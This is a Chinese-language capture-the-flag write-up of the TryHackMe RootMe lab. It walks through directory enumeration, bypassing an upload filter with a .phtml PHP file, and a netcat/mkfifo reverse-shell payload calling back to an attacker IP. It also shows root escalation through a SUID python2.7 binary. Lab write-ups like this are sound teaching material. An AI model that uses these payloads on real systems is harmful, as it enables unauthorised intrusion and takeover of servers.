# TryHackMe - RootMe Writeup

**房间难度**：Easy  
**所需技能**：Web 枚举、文件上传、SUID 提权  
**目标**：获得 root 权限并读取 `/root/root.txt`

---

## 信息收集

首先使用 `gobuster` 进行目录扫描：

```bash
gobuster dir -u http://10.49.139.147 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

发现关键目录：
- `/panel` → 文件上传页面
- `/uploads` → 上传文件存放目录

---

## 漏洞利用 - 文件上传

网站只允许上传图片文件（.jpg, .png, .gif）。

**绕过方法**：将 PHP 木马后缀改为 `.phtml`

**恶意文件内容**（`shell.phtml`）：

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 4444 >/tmp/f"); ?>
```

上传成功后，访问路径：
```
http://10.49.139.147/uploads/
```

成功执行文件，拿到 `www-data` 权限。

---

## 获得 Reverse Shell

使用以下命令获得稳定反向 Shell：

```bash
netcat -lvnp 4444
```

成功获得交互式 Shell。

---

## 权限提升 - SUID 提权

执行命令查找 SUID 文件：

```bash
find / -type f -perm -4000 2>/dev/null
```

发现异常 SUID 文件：
```
/usr/bin/python2.7
```

**Python2.7 被设置了 SUID 权限**，这是明显的提权点。

使用以下命令提权：

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

执行后输入 `whoami` 确认已为 **root**。

---

## 读取 Flag

```bash
cat /root/root.txt
```

## 总结

本次 RootMe 主要考察了以下知识点：

- 目录枚举与文件上传点发现
- 文件上传绕过（`.phtml` 后缀）
- SUID 权限误用导致的本地提权
- Python SUID 提权技巧

**核心**：  
任何不该拥有 SUID 权限的二进制文件（尤其是解释器）都可能是致命的提权点。

---

<div align="center">

**Writeup By YRww**

**Keep Hacking**

</div>
